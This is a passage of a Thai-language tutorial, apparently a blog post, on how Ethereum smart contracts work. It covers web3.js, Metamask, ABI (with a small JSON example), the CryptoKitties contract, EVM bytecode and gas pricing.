\u0e19\u0e31\u0e48\u0e19\u0e41\u0e2b\u0e25\u0e30\u0e04\u0e37\u0e2d Backend Server \u0e41\u0e15\u0e48\u0e40\u0e1b\u0e47\u0e19 Server \u0e41\u0e1a\u0e1a\u0e01\u0e23\u0e30\u0e08\u0e32\u0e22\u0e28\u0e39\u0e19\u0e22\u0e4c\u0e01\u0e25\u0e32\u0e07\u0e42\u0e14\u0e22\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e40\u0e23\u0e32\u0e21\u0e35 Smart Contract \u0e1a\u0e19 Ethereum \u0e41\u0e25\u0e49\u0e27 User \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e0a\u0e49 Client (\u0e40\u0e0a\u0e48\u0e19 Web Browser + Web3.js \u0e2b\u0e23\u0e37\u0e2d Myetherwallet + ABI) \u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e44\u0e1b\u0e2b\u0e32 Ethereum \u0e44\u0e14\u0e49\u0e40\u0e25\u0e22\u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35 Backend Server (Server \u0e40\u0e2d\u0e32\u0e44\u0e27\u0e49 Serve Frontend/\u0e23\u0e31\u0e1a Notification/Cache \u0e41\u0e25\u0e30\u0e40\u0e01\u0e47\u0e1a\u0e23\u0e39\u0e1b\u0e01\u0e47\u0e40\u0e1e\u0e35\u0e22\u0e07\u0e1e\u0e2d)\u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c CryptoKitties \u0e0b\u0e36\u0e48\u0e07\u0e43\u0e0a\u0e49 Web3.js \u0e41\u0e25\u0e30 Login With Metamask\u0e2b\u0e23\u0e37\u0e2d User \u0e08\u0e30\u0e43\u0e0a\u0e49 Myetherwallet \u0e44\u0e1b\u0e04\u0e38\u0e22\u0e01\u0e31\u0e1a CryptoKitties Smart Contract \u0e15\u0e23\u0e07 \u0e46 \u0e01\u0e47\u0e44\u0e14\u0e49Smart Contract \u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35 Owner \u0e2b\u0e23\u0e37\u0e2d\u0e04\u0e19 Deploy \u0e40\u0e2a\u0e21\u0e2d \u0e42\u0e14\u0e22\u0e40\u0e21\u0e37\u0e48\u0e2d Deploy \u0e41\u0e25\u0e49\u0e27\u0e08\u0e30\u0e21\u0e35 Address \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07 \u0e40\u0e21\u0e37\u0e48\u0e2d\u0e21\u0e35 Address \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e01\u0e47\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e01\u0e47\u0e1a\u0e40\u0e07\u0e34\u0e19\u0e44\u0e14\u0e49\u0e14\u0e49\u0e27\u0e22 \u0e16\u0e49\u0e32\u0e1c\u0e39\u0e49 Deploy \u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e19\u0e33\u0e40\u0e07\u0e34\u0e19\u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 Smart Contract \u0e01\u0e47\u0e15\u0e49\u0e2d\u0e07\u0e40\u0e02\u0e35\u0e22\u0e19\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19\u0e43\u0e19\u0e01\u0e32\u0e23\u0e42\u0e2d\u0e19\u0e2d\u0e2d\u0e01\u0e44\u0e1b\u0e2b\u0e32\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e44\u0e27\u0e49\u0e14\u0e49\u0e27\u0e22Smart Contract \u0e02\u0e2d\u0e07 CryptoKitties \u0e21\u0e35 Address \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07 \u0e41\u0e25\u0e30\u0e21\u0e35\u0e40\u0e07\u0e34\u0e19\u0e2d\u0e22\u0e39\u0e48 67.34 Ether \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e08\u0e49\u0e32\u0e02\u0e2d\u0e07 Smart Contract \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e16\u0e2d\u0e19\u0e40\u0e07\u0e34\u0e19\u0e2d\u0e2d\u0e01\u0e44\u0e14\u0e49\u0e1c\u0e48\u0e32\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 withdrawBalanceUser \u0e1a\u0e19 Ethereum \u0e19\u0e31\u0e49\u0e19\u0e01\u0e47\u0e43\u0e0a\u0e49\u0e2b\u0e25\u0e31\u0e01\u0e01\u0e32\u0e23\u0e40\u0e14\u0e35\u0e22\u0e27\u0e01\u0e31\u0e19\u0e01\u0e31\u0e1a Blockchain \u0e17\u0e31\u0e48\u0e27\u0e44\u0e1b\u0e04\u0e37\u0e2d \u0e44\u0e21\u0e48\u0e21\u0e35 Username, Password \u0e21\u0e35\u0e40\u0e1e\u0e35\u0e22\u0e07\u0e41\u0e04\u0e48 Public Key \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e41\u0e17\u0e19\u0e02\u0e2d\u0e07 Username \u0e41\u0e25\u0e30 Private Key \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e41\u0e17\u0e19\u0e02\u0e2d\u0e07 Password \u0e41\u0e25\u0e30\u0e43\u0e0a\u0e49 Digital Signature \u0e2b\u0e23\u0e37\u0e2d\u0e25\u0e32\u0e22\u0e40\u0e0b\u0e47\u0e19\u0e14\u0e34\u0e08\u0e34\u0e15\u0e2d\u0e25\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e15\u0e48\u0e32\u0e07 \u0e46User \u0e17\u0e38\u0e01\u0e04\u0e19\u0e1a\u0e19 Ethereum \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2b\u0e32 Smart Contract \u0e43\u0e14 \u0e46 \u0e01\u0e47\u0e44\u0e14\u0e49 \u0e0b\u0e36\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e17\u0e35\u0e48\u0e17\u0e33\u0e44\u0e14\u0e49\u0e01\u0e47\u0e15\u0e32\u0e21\u0e17\u0e35\u0e48 Smart Contract \u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15 \u0e44\u0e27\u0e49 \u0e42\u0e14\u0e22\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e1a\u0e19 Web Browser \u0e17\u0e31\u0e48\u0e27\u0e44\u0e1b\u0e19\u0e31\u0e49\u0e19 User \u0e21\u0e31\u0e01\u0e08\u0e30\u0e43\u0e0a\u0e49 Metamask \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19 Chrome Extension \u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e01\u0e47\u0e1a Private Key \u0e41\u0e25\u0e30\u0e17\u0e33\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e47\u0e19\u0e25\u0e32\u0e22\u0e40\u0e0b\u0e47\u0e19\u0e14\u0e34\u0e08\u0e34\u0e15\u0e2d\u0e25\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e44\u0e1b\u0e2b\u0e32 Smart Contract\u0e01\u0e32\u0e23\u0e17\u0e33 Website \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49 User \u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19 Metamask \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e40\u0e02\u0e49\u0e32\u0e16\u0e36\u0e07 Smart Contract \u0e1a\u0e19 Ethereum \u0e44\u0e14\u0e49\u0e19\u0e31\u0e49\u0e19\u0e08\u0e30\u0e43\u0e0a\u0e49 Javascript Library \u0e0a\u0e37\u0e48\u0e2d web3.js \u0e42\u0e14\u0e22\u0e2b\u0e32\u0e01 User \u0e17\u0e33\u0e01\u0e32\u0e23\u0e15\u0e34\u0e14\u0e15\u0e31\u0e49\u0e07 Metamask \u0e44\u0e27\u0e49\u0e41\u0e25\u0e49\u0e27 \u0e1a\u0e19\u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c\u0e17\u0e38\u0e01\u0e40\u0e27\u0e47\u0e1a\u0e44\u0e21\u0e48\u0e27\u0e48\u0e32\u0e08\u0e30\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e02\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e1a Ethereum \u0e2b\u0e23\u0e37\u0e2d\u0e44\u0e21\u0e48\u0e01\u0e47\u0e08\u0e30\u0e16\u0e39\u0e01 Inject \u0e15\u0e31\u0e27 web3.js \u0e44\u0e27\u0e49\u0e42\u0e14\u0e22 Metamask \u0e2d\u0e22\u0e39\u0e48\u0e41\u0e25\u0e49\u0e27\u0e16\u0e49\u0e32\u0e04\u0e38\u0e13\u0e25\u0e07 Metamask \u0e44\u0e27\u0e49\u0e41\u0e25\u0e49\u0e27 \u0e25\u0e2d\u0e07\u0e04\u0e25\u0e34\u0e01\u0e02\u0e27\u0e32 Inspect \u0e40\u0e27\u0e47\u0e1a\u0e2d\u0e30\u0e44\u0e23\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e41\u0e25\u0e49\u0e27\u0e1e\u0e34\u0e21\u0e1e\u0e4c\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 web3 \u0e01\u0e47\u0e08\u0e30\u0e21\u0e35 return \u0e01\u0e25\u0e31\u0e1a\u0e21\u0e32\u0e40\u0e1e\u0e23\u0e32\u0e30 Metamask \u0e19\u0e31\u0e49\u0e19 Inject Web3 \u0e44\u0e27\u0e49\u0e43\u0e2b\u0e49\u0e17\u0e38\u0e01\u0e40\u0e27\u0e47\u0e1a\u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e40\u0e02\u0e49\u0e32\u0e01\u0e32\u0e23\u0e08\u0e30\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2b\u0e32 Smart Contract \u0e43\u0e14 \u0e46 \u0e19\u0e31\u0e49\u0e19 User \u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e17\u0e23\u0e32\u0e1a ABI \u0e2b\u0e23\u0e37\u0e2d Application Binary Interface \u0e02\u0e2d\u0e07 Smart Contract \u0e19\u0e31\u0e49\u0e19 \u0e46 \u0e42\u0e14\u0e22\u0e1c\u0e39\u0e49\u0e1e\u0e31\u0e12\u0e19\u0e32 Smart Contract \u0e08\u0e30\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a ABI \u0e08\u0e32\u0e01\u0e01\u0e32\u0e23 Compile \u0e41\u0e25\u0e49\u0e27\u0e19\u0e33\u0e44\u0e1b\u0e41\u0e08\u0e01\u0e08\u0e48\u0e32\u0e22\u0e43\u0e2b\u0e49 User \u0e42\u0e14\u0e22 User \u0e08\u0e30\u0e40\u0e2d\u0e32 ABI \u0e44\u0e1b\u0e43\u0e0a\u0e49\u0e01\u0e31\u0e1a MyEtherWallet \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2b\u0e32 Smart Contract \u0e01\u0e47\u0e44\u0e14\u0e49 \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e14\u0e39\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e02\u0e2d\u0e07 ABI \u0e44\u0e14\u0e49\u0e43\u0e19\u0e42\u0e04\u0e49\u0e14\u0e14\u0e49\u0e32\u0e19\u0e25\u0e48\u0e32\u0e07[ {  \"constant\": true,  \"inputs\": [],  \"name\": \"sayHello\",  \"outputs\": [   {    \"name\": \"\",    \"type\": \"string\"   }  ],  \"payable\": false,  \"stateMutability\": \"pure\",  \"type\": \"function\" }]\u0e41\u0e15\u0e48\u0e43\u0e19\u0e17\u0e32\u0e07\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e08\u0e23\u0e34\u0e07 Website \u0e2b\u0e23\u0e37\u0e2d Client \u0e02\u0e2d\u0e07\u0e1c\u0e39\u0e49\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e08\u0e30\u0e40\u0e01\u0e47\u0e1a ABI \u0e44\u0e27\u0e49\u0e17\u0e35\u0e48 Website \u0e41\u0e25\u0e30\u0e1c\u0e39\u0e01 web3.js \u0e43\u0e2b\u0e49 User \u0e2d\u0e22\u0e39\u0e48\u0e41\u0e25\u0e49\u0e27\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e07\u0e48\u0e32\u0e22\u0e15\u0e48\u0e2d\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e08\u0e32\u0e01 Metamask \u0e19\u0e31\u0e49\u0e19\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e40\u0e01\u0e47\u0e1a Private Key \u0e41\u0e17\u0e19 User \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e40\u0e01\u0e34\u0e14 Use Case \u0e43\u0e2b\u0e21\u0e48 \u0e46 \u0e17\u0e35\u0e48\u0e19\u0e48\u0e32\u0e2a\u0e19\u0e43\u0e08\u0e02\u0e36\u0e49\u0e19 \u0e40\u0e0a\u0e48\u0e19 \u0e01\u0e32\u0e23 Login With Metamask \u0e42\u0e14\u0e22 User \u0e44\u0e21\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e23\u0e2d\u0e01\u0e23\u0e2b\u0e31\u0e2a\u0e1c\u0e48\u0e32\u0e19\u0e41\u0e25\u0e30 Username \u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e43\u0e19 Website \u0e40\u0e25\u0e22\u0e41\u0e15\u0e48 User \u0e01\u0e47\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e23\u0e2d\u0e01 Password \u0e40\u0e1e\u0e37\u0e48\u0e2d Unlock Wallet \u0e01\u0e48\u0e2d\u0e19\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e17\u0e35\u0e48 Metamask \u0e2d\u0e22\u0e39\u0e48\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e04\u0e27\u0e32\u0e21\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22 \u0e41\u0e15\u0e48\u0e19\u0e31\u0e48\u0e19\u0e2b\u0e21\u0e32\u0e22\u0e04\u0e27\u0e32\u0e21\u0e27\u0e48\u0e32 Password \u0e19\u0e31\u0e49\u0e19\u0e16\u0e39\u0e01\u0e19\u0e33\u0e44\u0e1b\u0e16\u0e2d\u0e14\u0e23\u0e2b\u0e31\u0e2a\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e19\u0e33 Private Key \u0e2d\u0e2d\u0e01\u0e21\u0e32\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19 \u0e15\u0e31\u0e27 Password \u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e02\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e1a Website \u0e41\u0e15\u0e48\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e43\u0e14\u0e15\u0e48\u0e2d\u0e44\u0e1b\u0e19\u0e35\u0e49\u0e08\u0e30\u0e25\u0e07\u0e25\u0e36\u0e01\u0e44\u0e1b\u0e43\u0e19\u0e2a\u0e16\u0e32\u0e1b\u0e31\u0e15\u0e22\u0e01\u0e23\u0e23\u0e21\u0e41\u0e25\u0e30\u0e01\u0e32\u0e23\u0e17\u0e33\u0e07\u0e32\u0e19\u0e02\u0e2d\u0e07 Ethereum \u0e2d\u0e35\u0e01\u0e2b\u0e19\u0e48\u0e2d\u0e22 \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e42\u0e1b\u0e23\u0e41\u0e01\u0e23\u0e21\u0e40\u0e21\u0e2d\u0e23\u0e4c\u0e17\u0e35\u0e48\u0e21\u0e32\u0e2d\u0e48\u0e32\u0e19\u0e40\u0e02\u0e49\u0e32\u0e43\u0e08\u0e21\u0e32\u0e01\u0e02\u0e36\u0e49\u0e19\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e08\u0e32\u0e01 Smart Contract \u0e16\u0e39\u0e01 Deploy \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Ethereum \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19 Public Network \u0e1c\u0e39\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19 Smart Contract \u0e22\u0e31\u0e07\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e43\u0e2b\u0e49 Smart Contract \u0e15\u0e31\u0e27\u0e2d\u0e37\u0e48\u0e19\u0e21\u0e32\u0e2d\u0e48\u0e32\u0e19\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e2b\u0e23\u0e37\u0e2d\u0e23\u0e31\u0e19 Function \u0e08\u0e32\u0e01 Smart Contract \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e44\u0e14\u0e49\u0e2d\u0e35\u0e01\u0e14\u0e49\u0e27\u0e22 \u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e40\u0e02\u0e35\u0e22\u0e19 API \u0e40\u0e2b\u0e21\u0e37\u0e2d\u0e19\u0e01\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Server \u0e41\u0e1a\u0e1a\u0e2d\u0e37\u0e48\u0e19\u0e43\u0e19 CryptoZombie \u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e14\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e40\u0e01\u0e21\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e44\u0e1b\u0e15\u0e34\u0e14\u0e15\u0e48\u0e2d\u0e01\u0e31\u0e1a CryptoKitties \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19 Smart Contract \u0e02\u0e2d\u0e07\u0e04\u0e19\u0e2d\u0e37\u0e48\u0e19\u0e44\u0e14\u0e49\u0e42\u0e14\u0e22\u0e15\u0e23\u0e07 \u0e40\u0e0a\u0e48\u0e19 \u0e40\u0e02\u0e35\u0e22\u0e19\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19 FeedAndMultiply \u0e42\u0e14\u0e22\u0e1b\u0e49\u0e2d\u0e19\u0e41\u0e21\u0e27\u0e08\u0e32\u0e01 CryptoKitties \u0e43\u0e2b\u0e49 Zombie \u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e21\u0e2d\u0e07\u0e44\u0e14\u0e49\u0e27\u0e48\u0e32 Etherum \u0e17\u0e31\u0e49\u0e07 Network \u0e16\u0e37\u0e2d\u0e27\u0e48\u0e32\u0e40\u0e1b\u0e47\u0e19\u0e04\u0e2d\u0e21\u0e1e\u0e34\u0e27\u0e40\u0e15\u0e2d\u0e23\u0e4c 256 bit \u0e08\u0e33\u0e19\u0e27\u0e19 1 \u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07 \u0e42\u0e14\u0e22\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e17\u0e35\u0e48\u0e40\u0e02\u0e35\u0e22\u0e19\u0e1a\u0e19 Solidity \u0e08\u0e30\u0e16\u0e39\u0e01\u0e41\u0e1b\u0e25\u0e07\u0e40\u0e1b\u0e47\u0e19 EVM Bytecode \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e44\u0e1b\u0e23\u0e31\u0e19\u0e1a\u0e19 Ethereum Virtual Machine\u0e42\u0e14\u0e22\u0e1c\u0e39\u0e49\u0e17\u0e35\u0e48\u0e17\u0e33\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 Bytecode \u0e08\u0e23\u0e34\u0e07 \u0e46 \u0e41\u0e25\u0e49\u0e27\u0e19\u0e31\u0e49\u0e19\u0e01\u0e47\u0e04\u0e37\u0e2d Miner \u0e2b\u0e23\u0e37\u0e2d\u0e1c\u0e39\u0e49\u0e17\u0e35\u0e48\u0e15\u0e31\u0e49\u0e07\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07\u0e02\u0e38\u0e14 Ethereum \u0e42\u0e14\u0e22\u0e1c\u0e39\u0e49\u0e02\u0e38\u0e14\u0e08\u0e30\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a Ethereum \u0e40\u0e1b\u0e47\u0e19\u0e04\u0e48\u0e32\u0e15\u0e2d\u0e1a\u0e41\u0e17\u0e19\u0e43\u0e19\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 \u0e2a\u0e48\u0e27\u0e19\u0e1c\u0e39\u0e49\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e01\u0e47\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e08\u0e48\u0e32\u0e22 Ethereum \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e1b\u0e47\u0e19\u0e04\u0e48\u0e32\u0e23\u0e31\u0e19 \u0e42\u0e14\u0e22\u0e04\u0e48\u0e32\u0e15\u0e2d\u0e1a\u0e41\u0e17\u0e19\u0e19\u0e35\u0e49\u0e08\u0e30\u0e16\u0e39\u0e01\u0e40\u0e23\u0e35\u0e22\u0e01\u0e27\u0e48\u0e32\u0e04\u0e48\u0e32 GasGas \u0e08\u0e30\u0e21\u0e35\u0e23\u0e32\u0e04\u0e32\u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e43\u0e19\u0e2b\u0e19\u0e48\u0e27\u0e22 Gwei (Giga-wei \u0e42\u0e14\u0e22 wei \u0e04\u0e37\u0e2d\u0e2b\u0e19\u0e48\u0e27\u0e22\u0e40\u0e25\u0e47\u0e01\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14\u0e02\u0e2d\u0e07 Ethereum \u0e42\u0e14\u0e22 1 Ether = 10\u00b9\u2078 Wei ) \u0e42\u0e14\u0e22\u0e1c\u0e39\u0e49\u0e17\u0e35\u0e48\u0e43\u0e2b\u0e49 Gas Price \u0e21\u0e32\u0e01\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14\u0e21\u0e31\u0e01\u0e08\u0e30\u0e16\u0e39\u0e01 Miner \u0e19\u0e33\u0e44\u0e1b\u0e23\u0e31\u0e19\u0e01\u0e48\u0e2d\u0e19 \u0e19\u0e31\u0e48\u0e19\u0e40\u0e1b\u0e47\u0e19\u0e2a\u0e32\u0e40\u0e2b\u0e15\u0e38\u0e01\u0e32\u0e23\u0e02\u0e36\u0e49\u0e19\u0e25\u0e07\u0e02\u0e2d\u0e07 Gas Price\u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c\u0e1b\u0e23\u0e30\u0e40\u0e21\u0e34\u0e19\u0e23\u0e32\u0e04\u0e32 Gas \u0e43\u0e19\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 \u0e41\u0e15\u0e48\u0e1b\u0e01\u0e15\u0e34\u0e41\u0e25\u0e49\u0e27 Client \u0e01\u0e47\u0e08\u0e30\u0e40\u0e25\u0e37\u0e2d\u0e01\u0e23\u0e32\u0e04\u0e32 Gas \u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e2d\u0e22\u0e39\u0e48\u0e41\u0e25\u0e49\u0e27\u0e41\u0e15\u0e48\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e1b\u0e23\u0e31\u0e1a\u0e41\u0e15\u0e48\u0e07\u0e44\u0e14\u0e49\u0e08\u0e30\u0e40\u0e2b\u0e47\u0e19\u0e27\u0e48\u0e32 Gas Fee \u0e21\u0e35\u0e1b\u0e38\u0e48\u0e21 Edit \u0e42\u0e14\u0e22 User \u0e08\u0e30\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19\u0e23\u0e32\u0e04\u0e32 Gas \u0e41\u0e25\u0e30 Gas Limit \u0e44\u0e14\u0e49\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e17\u0e38\u0e01\u0e04\u0e23\u0e31\u0e49\u0e07 (\u0e19\u0e2d\u0e01\u0e08\u0e32\u0e01\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2d\u0e48\u0e32\u0e19\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25) \u0e1c\u0e39\u0e49\u0e23\u0e31\u0e19\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e08\u0e48\u0e32\u0e22 Ether \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e19\u0e33\u0e44\u0e1b\u0e08\u0e48\u0e32\u0e22\u0e04\u0e48\u0e32 Gas \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e08\u0e48\u0e32\u0e22 Gas \u0e43\u0e2b\u0e49 Miner \u0e42\u0e14\u0e22\u0e08\u0e33\u0e19\u0e27\u0e19 Gas \u0e17\u0e35\u0e48\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e41\u0e15\u0e48\u0e25\u0e30\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e08\u0e30\u0e44\u0e21\u0e48\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19\u0e41\u0e1b\u0e25\u0e07 \u0e41\u0e15\u0e48\u0e23\u0e32\u0e04\u0e32 Gas \u0e2d\u0e32\u0e08\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19\u0e41\u0e1b\u0e25\u0e07\u0e44\u0e14\u0e49 \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e41\u0e15\u0e48\u0e25\u0e30\u0e04\u0e23\u0e31\u0e49\u0e07\u0e2d\u0e32\u0e08\u0e15\u0e49\u0e2d\u0e07\u0e08\u0e48\u0e32\u0e22\u0e43\u0e19\u0e23\u0e32\u0e04\u0e32\u0e17\u0e35\u0e48\u0e41\u0e15\u0e01\u0e15\u0e48\u0e32\u0e07\u0e01\u0e31\u0e19 (\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e17\u0e31\u0e48\u0e27\u0e44\u0e1b\u0e41\u0e15\u0e48\u0e25\u0e30\u0e04\u0e23\u0e31\u0e49\u0e07\u0e2b\u0e23\u0e37\u0e2d\u0e41\u0e15\u0e48\u0e25\u0e30\u0e1a\u0e23\u0e23\u0e17\u0e31\u0e14\u0e08\u0e30\u0e43\u0e0a\u0e49 1 Gas \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b \u0e22\u0e34\u0e48\u0e07 Smart Contract \u0e21\u0e35\u0e2b\u0e25\u0e32\u0e22\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2b\u0e23\u0e37\u0e2d\u0e21\u0e35\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e21\u0e32\u0e01 \u0e1c\u0e39\u0e49\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e01\u0e47\u0e15\u0e49\u0e2d\u0e07\u0e08\u0e48\u0e32\u0e22 Gas \u0e08\u0e33\u0e19\u0e27\u0e19\u0e21\u0e32\u0e01\u0e02\u0e36\u0e49\u0e19)\u0e19\u0e2d\u0e01\u0e40\u0e2b\u0e19\u0e37\u0e2d\u0e44\u0e1b\u0e08\u0e32\u0e01\u0e01\u0e32\u0e23\u0e08\u0e48\u0e32\u0e22\u0e04\u0e48\u0e32 Gas \u0e43\u0e19 Smart Contract \u0e01\u0e47\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e02\u0e35\u0e22\u0e19\u0e43\u0e2b\u0e49\u0e1c\u0e39\u0e49\u0e43\u0e0a\u0e49\u0e2a\u0e48\u0e07 Ether \u0e44\u0e1b\u0e2b\u0e32 Smart Contract \u0e44\u0e14\u0e49\u0e14\u0e49\u0e27\u0e22 